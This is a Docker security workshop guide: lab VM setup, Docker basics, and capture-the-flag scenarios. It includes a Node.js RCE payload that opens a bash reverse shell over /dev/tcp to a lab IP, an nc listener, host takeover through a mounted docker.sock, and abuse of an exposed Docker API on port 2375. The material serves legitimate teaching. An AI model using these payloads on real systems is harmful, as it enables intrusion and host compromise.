<ul>
<li>Select <code>docker-ctf.ova</code> file from the <code>workshop-content</code> folder</li>
</ul>
<p><img src="environment-setup/images/select-ctf-ova.png" alt="selecting ctf ova" /></p>
<ul>
<li>Check the &quot;Reintialize the MAC address of all network cards&quot; checkbox, and click on Next to import the ova file</li>
</ul>
<p><img src="environment-setup/images/ctf-ova-settings.png" alt="ctf ova settings" /></p>
<ul>
<li>Use following credentials for <code>ctf</code> VM login</li>
</ul>
<pre><code class="language-bash">username: ctf
password: Dockerctf@321
</code></pre>
<p><img src="environment-setup/images/ctf-vm-login.png" alt="ctf vm login" /></p>
<ul>
<li>Your IP address may differ from what is visible in the screenshot. Please note down this IP address for later use</li>
</ul>
<h2><a class="header" href="#test-setup" id="test-setup">Test Setup</a></h2>
<h3><a class="header" href="#ensure-networking-within-vm" id="ensure-networking-within-vm">Ensure Networking within VM</a></h3>
<blockquote>
<p>Ensure you are able to <code>ping</code> one VM from the other.</p>
</blockquote>
<p><img src="environment-setup/images/vm-networking.png" alt="VM Networking" /></p>
<h3><a class="header" href="#ensure-ssh-access-from-host" id="ensure-ssh-access-from-host">Ensure SSH Access from Host</a></h3>
<blockquote>
<p>Ensure you are able to SSH into both <code>Student</code> and <code>CTF</code> VM from your host using an SSH client.</p>
</blockquote>
<p><img src="environment-setup/images/vm-host-ssh.png" alt="VM Host SSH" /></p>
<h1><a class="header" href="#ssh-into-machines" id="ssh-into-machines">SSH into machines</a></h1>
<h2><a class="header" href="#ssh-into-the-student-machine" id="ssh-into-the-student-machine">SSH into the student machine</a></h2>
<ul>
<li>Run the following command from your terminal. Make sure you replace the <code>STUDENTVMIP</code> ip address with your student vm ip address</li>
</ul>
<pre><code class="language-bash">ssh student@STUDENTVMIP
</code></pre>
<p><img src="environment-setup/images/student-ssh.png" alt="ssh into student vm" /></p>
<h2><a class="header" href="#ssh-into-the-ctf-machine" id="ssh-into-the-ctf-machine">SSH into the ctf machine</a></h2>
<ul>
<li>Run the following command from your terminal. Make sure you replace the <code>CTFVMIP</code> ip address with your ctf vm ip address</li>
</ul>
<pre><code class="language-bash">ssh ctf@CTFVMIP
</code></pre>
<p><img src="environment-setup/images/ctf-ssh.png" alt="ssh into ctf vm" /></p>
<h1><a class="header" href="#common-troubleshooting-steps" id="common-troubleshooting-steps">Common Troubleshooting Steps</a></h1>
<ul>
<li>If you encounter <code>REMOTE HOST IDENTIFICATION CHANGED</code> error. Please remove the conflicting entry by running the command printed</li>
</ul>
<p><img src="environment-setup/images/ssh-host-key-error.png" alt="ssh host key error" /></p>
<h1><a class="header" href="#internet-check" id="internet-check">Internet Check</a></h1>
<ul>
<li>Browse to <a href="https://appsecco.com">https://appsecco.com</a> from you host browser</li>
<li>Run <code>curl ifconfig.co</code> from your virtual machines</li>
</ul>
<h1><a class="header" href="#getting-started-with-docker" id="getting-started-with-docker">Getting started with docker</a></h1>
<h2><a class="header" href="#introduction-1" id="introduction-1">Introduction</a></h2>
<p>Docker containers wrap a piece of software in a complete filesystem that contains everything needed to run: code, runtime, system tools, system libraries and anything that can be installed on a server. This guarantees that the software will always run the same, regardless of its environment.</p>
<h3><a class="header" href="#run-your-first-docker-container" id="run-your-first-docker-container">Run your first docker container</a></h3>
<pre><code class="language-bash">docker run hello-world
</code></pre>
<ul>
<li>When you run <code>docker run</code> command
<ul>
<li>Docker engine checks if the image is available or not</li>
<li>If image is not available, docker engine will pull from docker registry</li>
<li>If image is available, docker engine will run the command locally</li>
</ul>
</li>
</ul>
<p><img src="getting-started-with-docker/images/helloworld-docker.png" alt="docker hello world container" /></p>
<h3><a class="header" href="#how-docker-works" id="how-docker-works">How Docker Works?</a></h3>
<ul>
<li><code>Docker</code> is the program that enables containers to be built, shipped and run</li>
<li>Docker Engine uses Linux Kernel namespaces and control groups</li>
</ul>
<p><img src="getting-started-with-docker/images/docker-architecture.png" alt="Docker Architecture" /></p>
<p><small>Image Reference: https://docs.docker.com/engine/docker-overview/</small></p>
<h3><a class="header" href="#terminology" id="terminology">Terminology</a></h3>
<ul>
<li>Docker Image
<ul>
<li>Read only file with OS, libraries and apps</li>
<li>Anyone can create a docker image</li>
<li>Images can be stored in Docker hub (default public registry) or private registry</li>
</ul>
</li>
<li>Docker Container
<ul>
<li>Stateful instance of an image with a writable layer</li>
<li>Contains everything needed to run your application</li>
<li>Based on one or more images</li>
</ul>
</li>
<li>Docker Registry
<ul>
<li>Repository of images</li>
</ul>
</li>
<li>Docker Hub
<ul>
<li>Public docker registry</li>
</ul>
</li>
</ul>
<h3><a class="header" href="#what-is-docker-hub" id="what-is-docker-hub">What is Docker Hub?</a></h3>
<ul>
<li>Docker Hub is the public registry that contains a large number of images available for your use</li>
</ul>
<p><img src="getting-started-with-docker/images/docker-hub.png" alt="Docker Hub" /></p>
<h3><a class="header" href="#docker-search" id="docker-search">Docker Search</a></h3>
<ul>
<li>You can also search through all publicly available images in docker hub</li>
</ul>
<pre><code class="language-bash">docker search wpscan
</code></pre>
<p><img src="getting-started-with-docker/images/docker-search-wpscan.png" alt="docker search command" /></p>
<h1><a class="header" href="#docker-run" id="docker-run">Docker run</a></h1>
<h3><a class="header" href="#running-docker-container" id="running-docker-container">Running docker container</a></h3>
<ul>
<li>Run the following command to start an Ubuntu container</li>
</ul>
<pre><code class="language-bash">docker run ubuntu:latest echo &quot;Welcome to Ubuntu&quot;
</code></pre>
<p><img src="getting-started-with-docker/images/docker-run-welcome-ubuntu.png" alt="welcome ubuntu docker" /></p>
<ul>
<li>Run the following command to start an Ubuntu container with interactive bash shell</li>
</ul>
<pre><code class="language-bash">docker run --name samplecontainer -it ubuntu:latest /bin/bash
</code></pre>
<p><img src="getting-started-with-docker/images/docker-interactive-bash.png" alt="docker interactive bash" /></p>
<h3><a class="header" href="#find-your-containers" id="find-your-containers">Find your containers</a></h3>
<ul>
<li>Listing running containers</li>
</ul>
<pre><code class="language-bash">docker ps
</code></pre>
<p><img src="getting-started-with-docker/images/docker-ps.png" alt="docker ps" /></p>
<ul>
<li>Listing all containers (runing/stopped)</li>
</ul>
<pre><code class="language-bash">docker ps -a
</code></pre>
<p><img src="getting-started-with-docker/images/docker-ps-a.png" alt="docker ps -a" /></p>
<h3><a class="header" href="#listing-docker-images" id="listing-docker-images">Listing docker images</a></h3>
<pre><code class="language-bash">docker images
</code></pre>
<p><img src="getting-started-with-docker/images/docker-images.png" alt="docker images" /></p>
<h3><a class="header" href="#running-container-in-detached-mode" id="running-container-in-detached-mode">Running container in detached Mode</a></h3>
<ul>
<li>Run an alpine container in the background</li>
</ul>
<pre><code class="language-bash">docker run --name pingcontainer -d alpine:latest ping 127.0.0.1 -c 50
</code></pre>
<ul>
<li>Looking at the logs (stdout) of a container</li>
</ul>
<pre><code>docker logs -f pingcontainer
</code></pre>
<p><img src="getting-started-with-docker/images/docker-detach-logs.png" alt="docker detach logs" /></p>
<h3><a class="header" href="#running-nginx-container-and-access-the-service" id="running-nginx-container-and-access-the-service">Running nginx container and access the service</a></h3>
<pre><code class="language-bash">docker run -d --name nginxalpine -p 7777:80 nginx:alpine
</code></pre>
<ul>
<li>Accessing the container service from the host system using mapped port</li>
</ul>
<pre><code class="language-bash">curl localhost:7777
</code></pre>
<p><img src="getting-started-with-docker/images/nginxalpine-host.png" alt="accessing nginx from host" /></p>
<ul>
<li>Accessing the container service using the container IP and container port</li>
</ul>
<pre><code class="language-bash">docker exec -it nginxalpine sh

ip addr

curl 172.17.0.2:80
</code></pre>
<p><img src="getting-started-with-docker/images/nginxalpine-container.png" alt="accessing nginx from container port" /></p>
<h1><a class="header" href="#dockerfile" id="dockerfile">Dockerfile</a></h1>
<p>A <code>Dockerfile</code> is a configuration file that contains instructions for building a Docker image</p>
<ul>
<li>Provides a more effective way to build images compared to using docker commit</li>
<li>Easily fits into your continuous integration and deployment process</li>
</ul>
<h2><a class="header" href="#example-dockerfile" id="example-dockerfile">Example Dockerfile</a></h2>
<ul>
<li><code>FROM</code> instruction specifies what the base image should be</li>
<li><code>RUN</code> instruction specifies a command to execute</li>
<li><code>CMD</code> is to provide defaults for an executing container</li>
</ul>
<pre><code class="language-Dockerfile"># Example of a comment
FROM ubuntu

RUN apt-get update
RUN apt-get install curl -y
RUN apt-get install htop -y

CMD [&quot;htop&quot;]
</code></pre>
<h2><a class="header" href="#create-a-simple-htop-container" id="create-a-simple-htop-container">Create a simple htop container</a></h2>
<ul>
<li>Create new directory and change to the directory</li>
</ul>
<pre><code class="language-bash">mkdir htop-container
cd htop-container
</code></pre>
<ul>
<li>Create below file using <code>vi Dockerfile</code></li>
</ul>
<pre><code class="language-Dockerfile">FROM ubuntu
LABEL MAINTAINER &quot;user@domain.com&quot;

RUN apt-get update &amp;&amp; apt-get install -y \
    curl \
    htop

CMD [&quot;htop&quot;]
</code></pre>
<ul>
<li>Build the docker container</li>
</ul>
<pre><code class="language-bash">docker build -t abh1sek/htop:1.0 .
</code></pre>
<p><img src="getting-started-with-docker/images/docker-build-image.png" alt="building docker image" /></p>
<ul>
<li>Running the <code>htop</code> container</li>
</ul>
<pre><code class="language-bash">docker run --rm -it abh1sek/htop:1.0
</code></pre>
<h2><a class="header" href="#references" id="references">References</a></h2>
<ul>
<li><a href="https://docs.docker.com/engine/reference/builder">Dockerfile reference</a></li>
<li><a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">Best practices for writing Dockerfiles</a></li>
</ul>
<h1><a class="header" href="#docker-management" id="docker-management">Docker Management</a></h1>
<p>There are different commands which will be very handy while using and managing docker containers.</p>
<h2><a class="header" href="#inspecting-container-or-image" id="inspecting-container-or-image">Inspecting container or image</a></h2>
<ul>
<li>Returns low-level information on Docker objects</li>
</ul>
<pre><code class="language-bash">docker inspect &lt;container name&gt;
docker inspect &lt;image name&gt;
</code></pre>
<ul>
<li>Let's inspect the <code>nginx:alpine</code> image</li>
</ul>
<pre><code class="language-bash">docker inspect nginx:alpine
</code></pre>
<p><img src="getting-started-with-docker/images/docker-inspect-nginx.png" alt="docker inspect nginx" /></p>
<h2><a class="header" href="#docker-history" id="docker-history">Docker history</a></h2>
<ul>
<li>Show the history of an image</li>
</ul>
<pre><code>docker history jess/htop
</code></pre>
<p><img src="getting-started-with-docker/images/docker-history.png" alt="docker history" /></p>
<h2><a class="header" href="#stopping-and-removing-container" id="stopping-and-removing-container">Stopping and removing container</a></h2>
<ul>
<li>Let's run an <code>nginx</code> container</li>
</ul>
<pre><code class="language-bash">docker run --name dummynginx -d nginx:alpine
</code></pre>
<ul>
<li>To remove a container, it has to be stopped. Stop the running container by container name or id</li>
</ul>
<pre><code class="language-bash">docker stop dummynginx
</code></pre>
<ul>
<li>If you do not remember container name or id, run following command</li>
</ul>
<pre><code class="language-bash">docker ps -a
</code></pre>
<ul>
<li>Once stopped, run the below command</li>
</ul>
<pre><code class="language-bash">docker rm dummynginx
</code></pre>
<p><img src="getting-started-with-docker/images/docker-stop-and-remove.png" alt="docker stop and remove" /></p>
<h1><a class="header" href="#docker-advanced-concepts" id="docker-advanced-concepts">Docker Advanced Concepts</a></h1>
<ul>
<li><a href="advanced-concepts/docker-compoe-wordpress.html">docker-compose wordpress</a></li>
<li><a href="advanced-concepts/docker-volumes-and-networks.html">docker volumes and networks</a></li>
<li><a href="advanced-concepts/docker-swarm.html">docker swarm</a></li>
<li><a href="advanced-concepts/portainer.html">Portainer</a></li>
</ul>
<h1><a class="header" href="#docker-compose-wordpress-setup" id="docker-compose-wordpress-setup">docker-compose wordpress setup</a></h1>
<p>Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a Compose file to configure your application's services. Then, using a single command, you create and start all the services from your configuration</p>
<ul>
<li>Let's setup wordpress site using docker-compose</li>
</ul>
<pre><code class="language-bash">cd /opt/wordpress
docker-compose up -d
</code></pre>
<p><img src="advanced-concepts/images/docker-compose-wordpress.png" alt="docker compose wordpress" /></p>
<ul>
<li>Access the wordpress site using <code>http://STUDENTVMIP:8000</code></li>
</ul>
<p><img src="advanced-concepts/images/wordpress-site.png" alt="wordpress site" /></p>
<blockquote>
<p>Ignore any error related to broken CSS. This is due to IP address mismatch in Wordpress configuration.</p>
</blockquote>
<h2><a class="header" href="#looking-at-docker-composeyml" id="looking-at-docker-composeyml">Looking at <code>docker-compose.yml</code></a></h2>
<ul>
<li>Inspecting the compose file by running <code>less /opt/wordpress/docker-compose.yml</code></li>
</ul>
<pre><code class="language-yml">version: '3.3'

services:
   db:
     image: mysql:5.7
     volumes:
       - db_data:/var/lib/mysql
     restart: always
     environment:
       MYSQL_ROOT_PASSWORD: SuperSecret321
       MYSQL_DATABASE: wordpress
       MYSQL_USER: wordpress
       MYSQL_PASSWORD: ComplicatedPassword

   wordpress:
     depends_on:
       - db
     image: wordpress:latest
     ports:
       - &quot;8000:80&quot;
     restart: always
     environment:
       WORDPRESS_DB_HOST: db:3306
       WORDPRESS_DB_USER: wordpress
       WORDPRESS_DB_PASSWORD: ComplicatedPassword
volumes:
    db_data:
</code></pre>
<h1><a class="header" href="#docker-volumes-and-networks" id="docker-volumes-and-networks">Docker volumes and networks</a></h1>
<h2><a class="header" href="#checking-for-the-docker-volumes" id="checking-for-the-docker-volumes">Checking for the docker volumes</a></h2>
<ul>
<li>Listing the docker volumes</li>
</ul>
<pre><code class="language-bash">docker volume ls
</code></pre>
<p><img src="advanced-concepts/images/docker-volumes.png" alt="docker volumes" /></p>
<ul>
<li>Creating new docker volume</li>
</ul>
<pre><code class="language-bash">docker volume create c0c0n
</code></pre>
<h2><a class="header" href="#checking-for-the-docker-networks" id="checking-for-the-docker-networks">Checking for the docker networks</a></h2>
<ul>
<li>Listing the docker networks</li>
</ul>
<pre><code class="language-bash">docker network ls
</code></pre>
<p><img src="advanced-concepts/images/docker-networks.png" alt="docker networks" /></p>
<ul>
<li>Creating new docker network</li>
</ul>
<pre><code class="language-bash">docker network create c0c0n
</code></pre>
<h1><a class="header" href="#docker-swarm" id="docker-swarm">Docker Swarm</a></h1>
<p>A swarm is a group of machines that are running Docker and joined into a cluster. After that has happened, you continue to run the Docker commands you're used to, but now they are executed on a cluster by a swarm manager. The machines in a swarm can be physical or virtual.</p>
<ul>
<li>Let's setup docker swarm cluster</li>
</ul>
<pre><code class="language-bash">docker swarm init
</code></pre>
<ul>
<li>Check the list of nodes</li>
</ul>
<pre><code class="language-bash">docker node ls
</code></pre>
<p><img src="advanced-concepts/images/docker-node.png" alt="list docker nodes" /></p>
<ul>
<li>Starting new service in docker swarm cluster</li>
</ul>
<pre><code class="language-bash">docker service create --replicas 1 --publish 5555:80 --name nginxservice nginx:alpine
</code></pre>
<p><img src="advanced-concepts/images/docker-service-create.png" alt="creating service" /></p>
<ul>
<li>Look at the running services</li>
</ul>
<pre><code class="language-bash">docker service ls
</code></pre>
<ul>
<li>Inspecting the service</li>
</ul>
<pre><code class="language-bash">docker service inspect --pretty nginxservice
</code></pre>
<ul>
<li>Accessing the service</li>
</ul>
<pre><code class="language-bash">curl STUDENTIP:5555
</code></pre>
<p><img src="advanced-concepts/images/docker-service-access.png" alt="accessing the service" /></p>
<ul>
<li>Removing the service</li>
</ul>
<pre><code class="language-bash">docker service rm nginxservice
</code></pre>
<ul>
<li>Leaving the swarm cluster</li>
</ul>
<pre><code class="language-bash">docker swarm leave

# If only one node in the cluster
docker swarm leave --force
</code></pre>
<h2><a class="header" href="#references-1" id="references-1">References</a></h2>
<ul>
<li><a href="https://docs.docker.com/engine/swarm/swarm-tutorial/">Getting started with swarm</a></li>
</ul>
<h1><a class="header" href="#portainer" id="portainer">Portainer</a></h1>
<p>Portainer is a simple management solution for Docker. Easily manage your Docker hosts and Docker Swarm clusters via Portainer web user interface.</p>
<ul>
<li>Run portainer using the below command</li>
</ul>
<pre><code class="language-bash">docker run -d -p 9000:9000 --name portainer \
    --restart always -v /var/run/docker.sock:/var/run/docker.sock \
    -v /opt/portainer:/data portainer/portainer
</code></pre>
<p><img src="advanced-concepts/images/run-portainer.png" alt="run portainer" /></p>
<ul>
<li>Now you can access portianer at http://STUDENTVMIP:9000</li>
</ul>
<p><img src="advanced-concepts/images/portainer-setup.png" alt="portainer setup" /></p>
<p><img src="advanced-concepts/images/portainer-select.png" alt="portainer setup" /></p>
<p><img src="advanced-concepts/images/portainer-dashboard.png" alt="Portainer Dashboard" /></p>
<h1><a class="header" href="#attacking-insecure-volume-mounts" id="attacking-insecure-volume-mounts">Attacking Insecure Volume Mounts</a></h1>
<ul>
<li><a href="attacking-insecure-volume-mounts/scenario.html">Scenario</a></li>
<li><a href="attacking-insecure-volume-mounts/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#attacking-insecure-volume-mounts---scenario" id="attacking-insecure-volume-mounts---scenario">Attacking insecure volume mounts - Scenario</a></h1>
<p>In this scenario we will be exploiting a NodeJS application using remote code execution to gain a reverse shell. Then we will use the volume mounted <code>docker.sock</code> to gain privileges in the host system with docker runtime.</p>
<ul>
<li>The application is running at CTF VM. You can access it by navigating to <code>http://CTFVMIP</code></li>
</ul>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mount-node-app.png" alt="node app home page" /></p>
<ul>
<li>This NodeJS application is vulnerable to remote code execution (RCE) in <code>q</code> GET parameter. Access the endpoint using <code>http://CTFVMIP/?q=&quot;docker&quot;</code></li>
</ul>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mount-vulnerable-parameter.png" alt="vulnerable parameter" /></p>
<ul>
<li>To exploit this RCE, we will be using below payload. Here <code>192.168.56.3</code> need to replace with your student VM IP</li>
</ul>
<pre><code class="language-bash">require(&quot;child_process&quot;).exec('bash -c &quot;bash -i &gt;%26 /dev/tcp/192.168.56.3/5555 0&gt;%261&quot;')
</code></pre>
<h1><a class="header" href="#attacking-insecure-volume-mounts---solution" id="attacking-insecure-volume-mounts---solution">Attacking insecure volume mounts - Solution</a></h1>
<ul>
<li>The application is running at CTF VM. You can access it by navigating to <code>http://CTFVMIP</code></li>
</ul>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mount-node-app.png" alt="node app home page" /></p>
<ul>
<li>This NodeJS application is vulnerable to remote code execution (RCE) in <code>q</code> GET parameter. Access the endpoint using <code>http://CTFVMIP/?q=&quot;docker&quot;</code></li>
</ul>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mount-vulnerable-parameter.png" alt="vulnerable parameter" /></p>
<ul>
<li>To exploit this RCE, we will be using below payload. Here <code>192.168.56.3</code> need to replace with your student VM IP</li>
</ul>
<pre><code class="language-bash">require(&quot;child_process&quot;).exec('bash -c &quot;bash -i &gt;%26 /dev/tcp/192.168.56.3/5555 0&gt;%261&quot;')
</code></pre>
<ul>
<li>Start the netcat listener on <code>student</code> machine to get the reverse shell</li>
</ul>
<pre><code class="language-bash">nc -lvp 5555
</code></pre>
<p><img src="attacking-insecure-volume-mounts/images/nc-student-listen.png" alt="nc listen in student vm" /></p>
<ul>
<li>To exploit and get reverse shell use the below URL. It contains the payload to connect back to student vm. Ensure that you have replaced <code>192.168.56.3</code> with your student VM IP</li>
</ul>
<pre><code class="language-bash">http://CTFVMIP?q=require(&quot;child_process&quot;).exec('bash -c &quot;bash -i &gt;%26 /dev/tcp/192.168.56.3/5555 0&gt;%261&quot;')
</code></pre>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mount-exploit.png" alt="reverse shell exploit" /></p>
<ul>
<li>Now we will receive the reverse shell in our student vm where we listening via <code>nc</code> </li>
</ul>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mont-reverse-shell.png" alt="reverse shell in nc" /></p>
<ul>
<li>
<p>Now, we have shell inside the docker container, we can explore the container for post exploitation</p>
</li>
<li>
<p>We can see that <code>ls -l /var/run/docker.sock</code> is available and mounted from the host system.</p>
</li>
</ul>
<p><img src="attacking-insecure-volume-mounts/images/insecure-mount-docker-socket.png" alt="docker socket" /></p>
<blockquote>
<p><strong>This allows attacker to access the host docker service using host option with docker client by using the UNIX socket</strong></p>
</blockquote>
<ul>
<li>The docker client is already downloaded into the container and is at <code>/root/docker</code></li>
</ul>
<pre><code class="language-bash">cd /root/docker/
ls -l
</code></pre>
<p><img src="attacking-insecure-volume-mounts/images/docker-client-file.png" alt="docker client files" /></p>
<ul>
<li>To access the host resource using the <code>docker.sock</code> UNIX socket. Run the following</li>
</ul>
<pre><code class="language-bash">./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
</code></pre>
<p><img src="attacking-insecure-volume-mounts/images/accessing-host-system-using-socket.png" alt="accessing host system using docker socket" /></p>
<ul>
<li>Now, we have full privilege over the host system :)</li>
</ul>
<h2><a class="header" href="#fixing-this-vulnerability" id="fixing-this-vulnerability">Fixing this vulnerability</a></h2>
<ul>
<li>Running the containers with limited user privileges and using rootless containers</li>
<li>Also using isolated instances for the required privileges</li>
</ul>
<h1><a class="header" href="#learning-more-about-containers" id="learning-more-about-containers">Learning more about containers</a></h1>
<ul>
<li><a href="attacking-docker-containers/namespaces.html">Namespaces</a></li>
<li><a href="attacking-docker-containers/capabilities.html">Capabilities</a></li>
<li><a href="attacking-docker-containers/../extra/control-groups.html">Control Groups</a></li>
</ul>
<h1><a class="header" href="#namespaces" id="namespaces">Namespaces</a></h1>
<p>Docker uses namespaces to provide the isolated workspace called the container. When you run a container, Docker creates a set of namespaces for that container.</p>
<ul>
<li>The <code>pid</code> namespace: Process isolation (PID: Process ID)</li>
<li>The <code>net</code> namespace: Managing network interfaces (NET: Networking)</li>
<li>The <code>ipc</code> namespace: Managing access to IPC resources (IPC: InterProcess Communication)</li>
<li>The <code>mnt</code> namespace: Managing filesystem mount points (MNT: Mount)</li>
<li>The <code>uts</code> namespace: Different host and domain names (UTS: Unix Timesharing System)</li>
<li>The <code>user</code> namespace: Isolate security-related identifiers (USER: userid, groupid)</li>
</ul>
<h2><a class="header" href="#namespaces-demonstration" id="namespaces-demonstration">Namespaces Demonstration</a></h2>
<pre><code>docker run --rm -d alpine sleep 1111

ps auxx | grep 'sleep 1111'

sudo ls /proc/[pid]/ns/
</code></pre>
<p><img src="attacking-docker-containers/images/docker-container-namespaces.png" alt="docker container namespaces" /></p>
<h3><a class="header" href="#pid-namespace" id="pid-namespace">PID namespace</a></h3>
<ul>
<li>
<p>PID namespaces isolate the process ID number space, meaning that processes in different PID namespaces can have the same PID</p>
</li>
<li>
<p>PID namespaces allow containers to provide functionality such as suspending/resuming the set of processes in the container and migrating the container to a new host while the processes inside the container maintain the same PIDs</p>
</li>
</ul>
<blockquote>
<p>For example, while running nginx docker container we always get PID 1 for nginx but at the host we see a different PID like <code>9989</code></p>
</blockquote>
<pre><code class="language-bash">docker run --rm --name=samplewebapp1 -d nginx:alpine
ps auxxx | grep nginx

docker exec -it samplewebapp1 sh
ps auxxx | grep nginx
</code></pre>
<p><img src="attacking-docker-containers/images/docker-nginx-1.png" alt="docker nginx 1" /></p>
<pre><code class="language-bash">docker run --rm --name=samplewebapp2 -d nginx:alpine
ps auxxx | grep nginx

docker exec -it samplewebapp2 sh
ps auxxx | grep nginx
</code></pre>
<p><img src="attacking-docker-containers/images/docker-nginx-2.png" alt="docker nginx 2" /></p>
<ul>
<li>Here we can see that both process have different pids in host system but inside containier they both use pid 1</li>
</ul>
<h3><a class="header" href="#attaching-host-processes-to-container" id="attaching-host-processes-to-container">Attaching host processes to container</a></h3>
<ul>
<li>We can also pass or attach the host process namespace or any other container process namespace to container using the --pid flag</li>
</ul>
<pre><code class="language-bash">docker run --rm -it --pid=host jess/htop
</code></pre>
<p><img src="attacking-docker-containers/images/docker-pid-host.png" alt="docker pid host" /></p>
<h1><a class="header" href="#capabilities" id="capabilities">Capabilities</a></h1>
<p>Capabilities turn the binary &quot;root/non-root&quot; into a fine-grained access control system. Processes (like web servers) that just need to bind on a port below 1024 do not have to run as root, they can just be granted the <code>net_bind_service</code> capability instead.</p>
<blockquote>
<p>Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled.</p>
</blockquote>
<h2><a class="header" href="#capabilities-demonstration" id="capabilities-demonstration">Capabilities Demonstration</a></h2>
<ul>
<li>Let's run ping command in a container</li>
</ul>
<pre><code class="language-bash">docker run --rm -it alpine sh

ping 127.0.0.1 -c 2
</code></pre>
<p><img src="attacking-docker-containers/images/capabilities-ping.png" alt="capabilities ping" /></p>
<ul>
<li>Now, let's remove the <code>CAP_NET_RAW</code> capability and try again</li>
</ul>
<pre><code class="language-bash">docker run --rm -it --cap-drop=NET_RAW alpine sh

ping 127.0.0.1 -c 2
</code></pre>
<p><img src="attacking-docker-containers/images/capabilities-ping-drop.png" alt="capabilities ping drop" /></p>
<h2><a class="header" href="#checking-for-the-list-of-capabilities" id="checking-for-the-list-of-capabilities">Checking for the list of capabilities</a></h2>
<ul>
<li>We can check the list of capabilities applied the container or system using the below command</li>
</ul>
<pre><code class="language-bash">docker run --rm -it 71aa5f3f90dc bash

capsh --print
</code></pre>
<p><img src="attacking-docker-containers/images/capsh-print.png" alt="capsh print" /></p>
<h2><a class="header" href="#running-the-full-privileged-container" id="running-the-full-privileged-container">Running the full privileged container</a></h2>
<ul>
<li>Run the below command to start a privileged container</li>
</ul>
<pre><code class="language-bash">docker run --rm -it --privileged=true 71aa5f3f90dc bash

capsh --print
</code></pre>
<p><img src="attacking-docker-containers/images/privileged-container.png" alt="privileged container" /></p>
<ul>
<li>It is possible to access the host devices from the privileged containers using <code>more /dev/kmsg</code></li>
</ul>
<blockquote>
<p>The /dev/kmsg character device node provides userspace access to the kernel's printk buffer.</p>
</blockquote>
<p><img src="attacking-docker-containers/images/privileged-container-kmsg.png" alt="/dev/kmsg log" /></p>
<h1><a class="header" href="#control-groups" id="control-groups">Control Groups</a></h1>
<p>The kernel uses cgroups also known as control groups to group processes for the purpose of system resource management. Cgroups allocate CPU time, system memory, network bandwidth, or combinations of these among user-defined groups of tasks.</p>
<ul>
<li>Let's run two containers with different cpu shares</li>
</ul>
<pre><code class="language-bash">docker run -d --name='low_priority' \
    --cpuset-cpus=0 --cpu-shares=10 alpine md5sum /dev/urandom

docker run -d --name='high_priority' \
    --cpuset-cpus=0 --cpu-shares=50 alpine md5sum /dev/urandom
</code></pre>
<ul>
<li>Now we can see the utilization status by running <code>htop</code></li>
</ul>
<pre><code class="language-bash">docker run --rm -it --pid host jess/htop
</code></pre>
<p><img src="extra/images/cgroup-with-shares.png" alt="cgroup with shares" /></p>
<ul>
<li>Stop and remove the running containers</li>
</ul>
<pre><code class="language-bash">docker stop low_priority high_priority
docker rm low_priority high_priority
</code></pre>
<ul>
<li>Now run the containers without any cpu shares specified</li>
</ul>
<pre><code class="language-bash">docker run -d --name='low_priority' alpine md5sum /dev/urandom
docker run -d --name='high_priority' alpine md5sum /dev/urandom
</code></pre>
<ul>
<li>Check resource utilization using <code>htop</code></li>
</ul>
<pre><code class="language-bash">docker run --rm -it --pid host jess/htop
</code></pre>
<p><img src="extra/images/cgroup-with-out-shares.png" alt="cgroup without shares" /></p>
<ul>
<li>Stop and remove the running containers</li>
</ul>
<pre><code class="language-bash">docker stop low_priority high_priority
docker rm low_priority high_priority
</code></pre>
<h2><a class="header" href="#references-2" id="references-2">References</a></h2>
<ul>
<li><a href="https://docs.docker.com/v17.09/engine/admin/resource_constraints/">Limit a container's resources</a></li>
</ul>
<h1><a class="header" href="#attacking-docker-misconfiguration" id="attacking-docker-misconfiguration">Attacking docker misconfiguration</a></h1>
<ul>
<li><a href="attacking-docker-misconfiguration/scenario.html">Scenario</a></li>
<li><a href="attacking-docker-misconfiguration/solution.html">Solution</a></li>
</ul>
<h1><a class="header" href="#exploiting-docker-misconfiguration---scenario" id="exploiting-docker-misconfiguration---scenario">Exploiting docker misconfiguration - Scenario</a></h1>
<p>In this scenario we will see a misconfigured <code>docker</code> instance with exposed TCP ports on the network. We will use this with docker runtime option to access the containers, images and gain host system privileges.</p>
<blockquote>
<p>The Docker daemon can listen for Docker Engine API requests via three different types of Socket <code>unix</code>, <code>tcp</code>, and <code>fd</code>. To access remotely we have to enable <code>tcp</code> socket. The default setup provides un-encrypted and un-authenticated direct access to the Docker daemon.</p>
</blockquote>
<ul>
<li>Your weapon to attack this scenario is the popular <code>nmap</code> tool</li>
</ul>
<h1><a class="header" href="#exploiting-docker-misconfiguration---solution" id="exploiting-docker-misconfiguration---solution">Exploiting docker misconfiguration - Solution</a></h1>
<blockquote>
<p>The Docker daemon can listen for Docker Engine API requests via three different types of Socket <code>unix</code>, <code>tcp</code>, and <code>fd</code>. To access remotely we have to enable <code>tcp</code> socket. The default setup provides un-encrypted and un-authenticated direct access to the Docker daemon. It is conventional to use port <code>2375</code> for un-encrypted, and port <code>2376</code> for encrypted communication with the daemon.</p>
</blockquote>
<ul>
<li>Scan the <code>2375</code> and <code>2376</code> port using nmap from student VM</li>
</ul>
<pre><code class="language-bash">nmap -p 2375,2376 -n 192.168.56.4 -v
</code></pre>
<p><img src="attacking-docker-misconfiguration/images/misconfig-nmap-scan.png" alt="nmap scan for port 2375" /></p>
<ul>
<li>We can query the docker API using <code>curl</code></li>
</ul>
<pre><code class="language-bash">curl 192.168.56.4:2375/images/json | jq .
</code></pre>
<p><img src="attacking-docker-misconfiguration/images/misconfig-curl-images.png" alt="accessing images via curl" /></p>
<ul>
<li>Attacker can abuse this by using the docker daemon configuration to access the host system's docker runtime</li>
</ul>
<pre><code class="language-bash">docker -H tcp://CTFVMIP:2375 ps
docker -H tcp://CTFVMIP:2375 images
</code></pre>
<p><img src="attacking-docker-misconfiguration/images/docker-tcp-host-access.png" alt="docker tcp host usage" /></p>
<ul>
<li>Now, we have full privilege over the host system :)</li>
</ul>
<h2><a class="header" href="#fixing-this-vulnerability-1" id="fixing-this-vulnerability-1">Fixing this vulnerability</a></h2>
